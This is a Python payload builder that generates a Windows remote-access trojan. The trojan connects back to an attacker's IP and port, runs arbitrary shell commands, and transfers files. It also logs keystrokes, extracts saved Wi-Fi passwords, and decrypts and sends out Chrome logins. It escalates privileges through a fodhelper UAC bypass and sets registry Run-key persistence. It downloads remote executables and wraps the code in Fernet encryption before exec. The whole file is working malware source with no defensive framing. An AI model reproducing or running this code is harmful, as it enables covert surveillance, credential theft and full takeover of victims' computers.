def build_payload(args):
    payload_code = f"""
from cryptography.fernet import Fernet
import base64
import socket
import tempfile
import json
import os
from pynput import keyboard
import time
import sys
import subprocess
# from vidstream import ScreenShareClient
import threading
import time
import requests
import re
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
code = b\"\"\"
def reliable_send(data):
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())
def priv1():
    execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result = execute.stdout + execute.stderr
    result = result.decode()
    reliable_send(result)
    
def priv2():
    execute1 = subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result1 = execute1.stdout + execute1.stderr
    result1 = result1.decode()
    reliable_send(result1)
def priv3():
    execute2 = subprocess.run(['powershell', 'Start-Process "C:\\Windows\\System32\\fodhelper.exe"'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result2 = execute2.stdout + execute2.stderr
    result2 = result2.decode()
    reliable_send("CMD")
def reliable_recv():
    data = ""
    while True:
        try:
            data = data + connection_to_attacker.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def upload_file(file_name):
    f = open(file_name, 'rb')
    packet = f.read(1024)
    while len(packet) > 0:
        connection_to_attacker.send(packet)
        packet = f.read(1024)
    connection_to_attacker.send('DONE'.encode())
def download_file(file_name):
    f = open(file_name, 'wb')
    while True:
        chunk = connection_to_attacker.recv(1024)
        if chunk.endswith('DONE'.encode()):
            f.write(chunk[:-4])
            f.close()
            break
        f.write(chunk)
#start of keylogger
global stopper
stopper = "hellno"
exit_event = threading.Event()
original_stdout = sys.stdout
def start_log():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
        os.mkdir(dir)
    except:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
    
    global hellfile
    hellfile=dir+"\\hellfile.txt"
    print(hellfile)
    f= open(hellfile,"w+")
    sys.stdout = f
    def on_press(key):
        try:
            f=open(hellfile, "a+")
            sys.stdout = f
            seconds = time.time()
            local_time = time.ctime(seconds)
            print(local_time, end="--------->")
            print('Alphanumeric key pressed: {0} '.format(
                key.char))
            f.close()
        except AttributeError:
            f=open(hellfile, "a+")
            sys.stdout = f
            seconds = time.time()
            local_time = time.ctime(seconds)
            print(local_time, end="--------->")
            print('special key pressed: {0}'.format(
                key))
            f.close()
    def on_release(key):
        f=open(hellfile, "a+")
        sys.stdout = f
        seconds = time.time()
        local_time = time.ctime(seconds)
        print(local_time, end="--------->")
        print('Key released: {0}'.format(
            key))
        f.close()
        if stopper == "stop":
        # Stop listener
            return False
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    f.close()
#end of key logger
#start of wifi password extraction
def wifi_password():
    temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    data_network = ''
    while temp_out.poll() is None:
        data_network = data_network + temp_out.stdout.readline().decode('utf-8')
        #print(data_network)
    #print(data_network)
    networks = re.findall("(?:Profile\\\\s*:\\\\s)(.*?\\\\r)",data_network)
    #print(networks)
    mess = "WiFi Password"
    mess = mess + "------------------------------------------\\\\n"
    Wifi_name = "Network\t:\tPassword"
    for i in networks:
        i = i.replace("\\\\r", "")
        Wifi_name = i
        temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = ""
        while temp_out.poll() is None:
            output = output + temp_out.stdout.readline().decode('utf-8')
        #print(output)
        Type_net = re.findall("(?:Type\\\\s*:\\\\s)(.*?\\\\r)", output)[0]
        password = ""
        pas = re.findall("(?:Key\\\\sContent\\\\s*:\\\\s)(.*?\\\\r)", output)
        if pas:
            password = pas[0]
        mess = mess + Wifi_name + " ::::: " + password + "\\\\n"
    #print(mess)
    direc = os. getcwd()
    filename = '\Wifi_pass.txt'
    filename = direc+filename
    f=open(filename,"w+")
    f.write(mess)
    f.close()
    
#end of wifi password extraction
#start of chrome extraction
def chrome_get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def chrome_get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def chrome_decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def chrome_pass():
    key = chrome_get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    direc = os. getcwd()
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
        os.mkdir(dir)
    except:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
    fileloc = '\\chrome_pass.txt'
    fileloc = dir+fileloc
    f = open(fileloc,"w+")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = chrome_decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            f.write(f"Origin URL: " + origin_url)
            f.write(f"Action URL: " + action_url)
            f.write(f"Username: " + username)
            f.write(f"Password: " + password)
        else:
            continue
        if date_created != 86400000000 and date_created:
            f.write(f"Creation date: " + str(chrome_get_chrome_datetime(date_created)))
        if date_last_used != 86400000000 and date_last_used:
            f.write(f"Last Used: " + str(chrome_get_chrome_datetime(date_last_used)))
        f.write("="*50)
    cursor.close()
    db.close()
    f.close()
    try:
        os.remove(filename)
    except:
        pass
    fn = open(fileloc,"r")
    reliable_send(fn.read())
    
#end of chrome extraction
def downloadurl(url):
    jod_url = requests.get(url)
    file_name = "God Genesis.exe"
    with open (file_name, 'wb') as output_file:
        output_file.write(jod_url.content)
def connection():
    while True:
        time.sleep(5)
        try:
            connection_to_attacker.connect(("{args.ip}", {args.port}))
            shell()
            connection_to_attacker.close()
            break
        except:
            connection()
def shell():
    while True:
        command = reliable_recv()
        if command == 'terminate':
            connection_to_attacker.close()
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                file = os.getcwd()
                files = str(file)
                reliable_send(files)
            except:
                pass
        elif command == 'pwd':
            try:
                files = os.getcwd()
                files = str(files)
                reliable_send(files)
            except:
                pass
        elif command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            download_file(command[7:])
        elif command == 'user':
            try:
                detail = os.getlogin()
                detail = str(detail)
                reliable_send(detail)
            except:
                pass
        elif command == 'info':
            try:
                execute = subprocess.run("systeminfo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout.decode() + execute.stderr.decode()
                #result = result.decode()
                reliable_send(result)
            except:
                pass
        elif command == 'sc':
            try:
                execute = subprocess.run("sc query state=all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout.decode()+ execute.stderr.decode()
                #result = result.decode()
                reliable_send(result)
            except:
                pass
        elif command == 'help':
            pass
       # elif command == 'screenshare':
        #    try:
         #       screen_share()
          #  except:
           #     pass
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("Program Started")
            except:
                reliable_send("Failed To Start The Program")
        elif command == 'env':
            try:
                execute = subprocess.run(['powershell', 'Get-Childitem -path env:'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout + execute.stderr
                result = result.decode()
                reliable_send(result)
            except:
                pass
        elif command == 'av':
            try:
                execute = subprocess.run(['powershell', 'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct'], shell=True, stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout + execute.stderr
                result = result.decode()
                #print(result)
                reliable_send(result)
            except:
                pass
        elif command == 'python_install':
            try:
                execute = subprocess.run("curl https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe --output python-3.10.2-amd64.exe && python-3.10.2-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.decode()+ execute.stderr.decode()
                #result = result.decode()
                reliable_send(result)
            except:
                pass
        elif command[:8] == 'get':
            try:
                downloadurl(command[3:])
                reliable_send("Downloaded")
            except:
                reliable_send("Not Downloaded")
        elif command == 'keylogger':
                
                try:
                    t1 = threading.Thread(target=start_log)
                    t1.start()
                    
                except:
                    pass
        elif command == 'dump_keylogger':
                local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
                direc="temp"
                dir=os.path.join(local_state_path,direc)
                hellfile=dir+"\\hellfile.txt"
                fn=open(hellfile,"r")
                reliable_send(fn.read())
                fn.close()
        #working but first need to stop the thread don't know how
        elif command == 'del_keylogger_file':
            dir=os. getcwd() 
            hellfile=dir+"\hellfile.txt"
            if os.path.exists(hellfile):
                print("yes")
                os.remove(hellfile)
            else:
                print(hellfile)
                print("No")
#to stop thread
        elif command == 'stop_keylogger':
            time.sleep(0.5)
            t1.terminate()
            print("Killed sucessfully")
            
        elif command == 'wifi_password':
            try:
                wifi_password()
                direc = os. getcwd()
                filename = '\Wifi_pass.txt'
                filename = direc+filename
                fn=open(filename,"r")
                reliable_send(fn.read())
                fn.close()
            except:
                pass
        elif command == 'chrome_pass_dump':
            chrome_pass()
        elif command == 'privsec1':
            try:
                priv1()
            except:
                pass
        elif command == 'privsec2':
            try:
                priv2()
            except:
                pass
        elif command == 'privsec3':
            try:
                priv3()
            except:
                pass
                
    
        elif command == 'persistence1':
            try:
                persistent1()
                reliable_send("persistence Achieved Via Method 1")
            except:
                reliable_send("persistence Not Achieved")
                pass
                 
        elif command == 'persistence2':
            try:
                destination = os.environ["appdata"] + "\\sys32.exe"
                print(destination)
                if not os.path.exists(destination):
                    shutil.copyfile(sys.executable, destination)
                    subprocess.run('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v GodGenesis /t REG_SZ /d "'+ destination + '"', shell=True)            
                    reliable_send("persistence Achieved Via Method 2")
                else:
                    reliable_send("Persistent Established Before")
            except:
                reliable_send("persistence Not Achieved")
                pass
                
        
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)
            except:
                pass
connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
\"\"\"
key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)
decrypted_message = encryption_type.decrypt(encrypted_message)
exec(decrypted_message)
"""
    with open(f"{args.outfile}.py", "w") as payload:
        payload.write(payload_code)
        payload.close()
        print(f"[+] Payload generated: {payload.name}")
